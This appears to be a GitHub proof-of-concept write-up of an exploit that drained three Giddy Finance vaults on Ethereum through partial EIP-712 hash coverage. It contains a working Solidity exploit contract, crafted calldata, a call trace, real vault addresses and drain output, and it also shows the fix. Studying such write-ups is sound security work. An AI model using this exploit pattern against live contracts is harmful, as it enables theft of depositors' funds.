# Giddy-1.3m-PoC

**Chain:** Ethereum  
**Root Cause:** EIP-712 `typeHash` only covers `keccak256(data)` inside `SwapInfo`, not `aggregator`, `fromToken`, `toToken`, or `amount`

---

## Summary

Giddy Finance operates a vault system (`GiddyVaultV3`) where users deposit LP tokens, a permissioned `compound()` function allows an authorized signer to reinvest rewards via token swaps.

```
User/Bot → CompoundProxy → CompoundImpl (delegatecall) → Vault.swapRewardTokens()
```

`compound()` function accepts an EIP-712 signed `CompoundParams` struct

```solidity
struct SwapInfo {
    address fromToken;
    address aggregator;
    uint256 amount;
    address toToken;
    bytes   data;
}

struct CompoundParams {
    bytes       sig;
    bytes32     hash;
    uint256     deadline;
    uint256     tokenAmount;
    SwapInfo[]  claimInfos;
    SwapInfo[]  swapInfos;
}
```

## Root cause

vulnerability is a **partial EIP-712 hash coverage** bug, the `SwapInfo` struct type hash should include all fields that affect execution semantics

```
// VULNERABLE: only hashes keccak256(data)
typeHash = keccak256("SwapInfo(bytes data)")

// SECURE: hashes all fields
typeHash = keccak256("SwapInfo(address fromToken,address aggregator,uint256 amount,address toToken,bytes data)")
```

Exploit TX 

by omitting `fromToken`, `aggregator`, `toToken`, and `amount` from the signed hash, any holder of a valid signature can redirect swaps to arbitrary contracts, effectively gaining unlimited ERC-20 approvals from the vault.

EIP-712 signature validation hashes the `SwapInfo` struct using a `typeHash` that only includes `keccak256(data)`, the fields `fromToken`, `aggregator`, `toToken`, and `amount` are **not covered** by the signature

this means an attacker can:
1. Observe a legitimate `compound()` transaction in the mempool (or from past blocks)
2. Extract the valid `sig`, `hash`, `deadline`, `tokenAmount`, and the `data` blobs
3. Replace `fromToken`, `aggregator`, `toToken`, and `amount` with attacker-controlled values
4. The modified calldata still passes signature verification

attacker deploys a single contract that serves two roles simultaneously

- **Fake Aggregator**: receives the swap callback from the vault via `fallback()`
- **Fake ERC20 (toToken)**: implements `balanceOf()`, `transfer()`, etc. so the vault balance-change validation passes

```solidity
contract GiddyExploit {
    address public immutable owner;
    mapping(address => uint256) private _fakeBalances;
    address private _lpToken;
    address private _lpHolder;

    function exploit(address compoundTarget, address lpHolder, address lpToken, bytes calldata depositCalldata) external {
        _lpToken = lpToken;
        _lpHolder = lpHolder;
        (bool ok,) = compoundTarget.call(depositCalldata);
        require(ok, "deposit failed");
        // After compound(), vault has approved us for MAX — drain it
        uint256 balance = IERC20(lpToken).balanceOf(lpHolder);
        if (balance > 0) {
            IERC20(lpToken).transferFrom(lpHolder, owner, balance);
        }
    }

    fallback() external payable {
        _fakeBalances[msg.sender] += 1;  // toToken balance increases (passes SWAP_NO_TOKENS_RECEIVED check)
        if (_lpToken != address(0)) {
            IERC20(_lpToken).transferFrom(_lpHolder, address(this), 1);  // fromToken balance decreases (passes INVALID_SRC_BALANCE_CHANGE check)
        }
    }
}
```

## Crafted calldata

attacker builds a `CompoundParams` with modified `SwapInfo`

| Field | Legitimate Value | Attacker Value |
|---|---|---|
| `fromToken` | reward token (e.g., DAI) | **LP token** (vault's staked LP) |
| `aggregator` | Paraswap / 1inch | **attacker contract** |
| `toToken` | base token (e.g., crvUSD) | **attacker contract** (fake ERC20) |
| `amount` | swap amount | `type(uint256).max` |
| `data` | swap route data | **unchanged** (covered by signature) |

function selector used is `compound()` = `0xd41ff3d3` (not `deposit()` = `0x7fa413a0`), and the swap data is placed in `swapInfos` (the 6th ABI field) to trigger `swapRewardTokens()`.

```
1. Attacker → exploit(compoundProxy, vault, lpToken, craftedCalldata)
2.   → CompoundProxy.compound(params)
3.     → CompoundImpl.compound(params)  [delegatecall]
4.       → ecrecover(hash, sig) → authorized signer ✓
5.       → Vault.swapRewardTokens(swapInfos)
6.         → Vault context: LP.approve(attackerContract, type(uint256).max)  ← KEY STEP
```

<img width="1712" height="155" alt="image" src="https://github.com/user-attachments/assets/2fe66eeb-4ee4-4a2c-9f88-e3acba3da72b" />

```
7.         → Vault context: LP.balanceOf(vault) → records pre-swap balance
8.         → Vault context: attackerContract.balanceOf(vault) → 0
9.         → attackerContract.call(data)  ← fallback triggered
10.          → fallback: _fakeBalances[vault] += 1  (toToken balance now 1)
11.          → fallback: LP.transferFrom(vault, self, 1)  (fromToken balance decreased)
```

<img width="1669" height="237" alt="image" src="https://github.com/user-attachments/assets/12eaa5e0-9aa8-4306-8852-82a1bb3a78e8" />

<img width="1674" height="232" alt="image" src="https://github.com/user-attachments/assets/ccda70d2-c5b6-44e4-8bd7-c0b11300c5ce" />

<img width="1674" height="232" alt="image" src="https://github.com/user-attachments/assets/c1a7e7bf-4ec3-4b9b-846d-f08aa2111721" />

```
12.        → Vault context: LP.balanceOf(vault) → decreased ✓ (INVALID_SRC_BALANCE_CHANGE passes)
13.        → Vault context: attackerContract.balanceOf(vault) → 1 > 0 ✓ (SWAP_NO_TOKENS_RECEIVED passes)
14.   → compound() returns successfully
15.   → LP.transferFrom(vault, owner, vault.balance)  ← DRAIN using MAX approval from step 6
```

critical insight is step 6 `swapRewardTokens()` runs in the **vault context** (the vault proxy delegates to its implementation), when it calls `IERC20(fromToken).approve(aggregator, MAX)`, `fromToken` is now the LP token and `aggregator` is the attacker contract, this grants the attacker `type(uint256).max` approval to spend the vault LP tokens.

The vault performs two post-swap balance checks

1. **INVALID_SRC_BALANCE_CHANGE**: `fromToken` balance must decrease after the swap, the fallback transfers exactly 1 LP token from the vault to satisfy this.

2. **SWAP_NO_TOKENS_RECEIVED**: `toToken` balance must increase, the attacker contract's `balanceOf()` returns `_fakeBalances[msg.sender]`, which increments by 1 on each fallback call.

for vaults with multiple swap entries (Vaults 2 and 3 have 2 swaps each), the `+=` increment ensures the second swap also shows an increase (0→1, then 1→2).

| Vault | Address | LP Token | LP Drained |
|---|---|---|---|
| Vault 1 | `0xC99FC715E73294FD03B7C09d9a438A98F6C76ec3` | `0x30ba...0D21` | 3,531,384,449,443,560,255 |
| Vault 2 | `0x0d5e628A44E7Ec94a2054A6c454127cfe5FcB690` | `0xf308...0893` | 6,935,949,844,931,976,727 |
| Vault 3 | `0x870fcD63DB2c68D8079166E311b1118B8aA26eD7` | `0xbc56...d7aa` | 6,274,444,990,265,641,148 |

all three vaults were drained to exactly 0 LP tokens in a single transaction at block 24,942,492.

**Output:**
```
--- PRE-ATTACK STATE ---
Vault 1 LP balance: 3531384449443560255
Vault 2 LP balance: 6935949844931976727
Vault 3 LP balance: 6274444990265641148

--- POST-ATTACK STATE ---
Vault 1 LP balance: 0
Vault 2 LP balance: 0
Vault 3 LP balance: 0

--- TOTAL DRAINED ---
Vault 1: 3531384449443560255
Vault 2: 6935949844931976727
Vault 3: 6274444990265641148
```

```
// VULNERABLE: only hashes keccak256(data)
typeHash = keccak256("SwapInfo(bytes data)")

// SECURE: hashes all fields
typeHash = keccak256("SwapInfo(address fromToken,address aggregator,uint256 amount,address toToken,bytes data)")
```

by omitting `fromToken`, `aggregator`, `toToken`, and `amount` from the signed hash, any holder of a valid signature can redirect swaps to arbitrary contracts, effectively gaining unlimited ERC-20 approvals from the vault.
